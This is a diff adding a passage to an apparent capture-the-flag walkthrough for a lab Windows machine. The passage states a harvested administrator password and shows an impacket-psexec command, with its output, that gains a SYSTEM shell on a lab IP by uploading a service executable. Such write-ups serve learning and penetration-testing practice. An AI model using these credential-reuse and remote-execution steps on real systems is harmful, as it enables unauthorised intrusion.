@@ -490,7 +490,32 @@ exit
 
 ### Gain administrator access
 
+We know the administrator username is `administrator` and password is `MEGACORP_4dm1n!!`. Now, we can follow either of the two methods to login as the administrator.&#x20;
+
 ### Using impacket-psexec
+
+```awk
+impacket-psexec ARCHETYPE/administrator@10.129.95.187 
+```
+
+After providing the password at the prompt we get the shell access:
+
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.95.187.....
+[*] Found writable share ADMIN$
+[*] Uploading file VuaxbZOR.exe
+[*] Opening SVCManager on 10.129.95.187.....
+[*] Creating service lSNA on 10.129.95.187.....
+[*] Starting service lSNA.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+```
 
 ### Using evil-winrm
 
